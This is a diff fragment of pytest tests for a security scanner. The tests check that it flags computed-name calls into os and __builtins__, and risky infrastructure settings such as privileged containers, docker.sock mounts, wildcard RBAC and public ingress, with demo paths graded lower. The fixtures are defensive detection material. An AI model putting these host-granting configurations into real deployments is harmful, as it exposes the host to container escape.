+            "import os\nf = getattr(os, pick())\n",
+            # And `__builtins__`, where nothing is a value worth fetching by a computed
+            # name whether it is called here or passed somewhere that will call it.
+            "__builtins__[name]\n",
+        ],
+    )
+    def test_reaching_a_function_still_is(self, source: str) -> None:
+        assert self._dispatch(source)
+
+
+class TestTheClassThatTurnedUpNothing:
+    """The eleventh sampling round, kept as a test because a round that finds nothing is
+    the result the loop was run for.
+
+    103 targets were mirrored for the four infrastructure-posture rules --
+    `SUSPECT.IAC.PRIVILEGED.001`, `SUSPECT.K8S.RBAC_WILDCARD.001`,
+    `SUSPECT.K8S.CAPABILITIES.001`, `SUSPECT.IAC.PUBLIC_INGRESS.001` -- and 58 findings
+    came back. Every one was the literal text the rule names: `privileged: true`,
+    `verbs: ["*"]`, `cap_add:`, `hostNetwork: true`,
+    `/var/run/docker.sock:/var/run/docker.sock`, `source_address_prefix = "*"`.
+
+    The fixture ceiling for these was added in an earlier pass, with the 649 Kubernetes
+    round-trip serialisation fixtures that prompted it written into its comment. What
+    remained after it were real deployment descriptors that genuinely request the host.
+
+    One inconsistency came out of the round and is the only change it made: `demo` was a
+    compound directory word and not a filename one, which is the same statement written
+    one level down.
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "2022/Days/Kubernetes/pacman-stateful-demo.yaml",
+            "k8s/demo-cluster.yaml",
+            "charts/demos/values.yaml",
+        ],
+    )
+    def test_a_filename_saying_demo_is_read(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            # The controls: a word that merely contains `demo`, and the real deployment
+            # descriptors the round left reported.
+            "app/demographics.py",
+            "plugins/scheduler-k3s/templates/chart/deployment.yaml",
+            "deploy/accelerators/amd-gpu/compose.yaml",
+        ],
+    )
+    def test_everything_else_is_still_source(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert not is_test_material(path)
+
+    def test_a_privileged_container_in_a_real_compose_file_still_blocks(self, tmp_path) -> None:
+        """The claim the round confirmed rather than changed. `privileged: true` grants
+        the host, the finding says so, and a project that needs it has a baseline entry
+        with a justification -- which is the distinction this whole pass was drawing."""
+        (tmp_path / "docker-compose.yml").write_text(
+            "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n"
+        )
+        assert "SUSPECT.IAC.PRIVILEGED.001" in flagged(tmp_path)
+
+    def test_the_same_file_under_a_demo_name_is_graded(self, tmp_path) -> None:
+        """And the ceiling is a grade, not an exemption: somebody copying a demo manifest
+        into production is the reason it stays in the report at all.
+
+        Through the DIRECTORY here rather than the filename, because these rules select
+        on manifest paths: `compose-demo.yml` is not a compose file by any name Docker
+        recognises, so the rule never reaches it and the test would have asserted
+        nothing. `docker-mailserver` keeps the real shape at `demo-setups/`."""
+        demo = tmp_path / "demo-setups"
+        demo.mkdir()
+        (demo / "docker-compose.yml").write_text(
+            "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n"
+        )
+        found = [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.IAC.PRIVILEGED.001"
+        ]
+        assert found
+        assert all(f.severity <= Severity.MEDIUM for f in found)
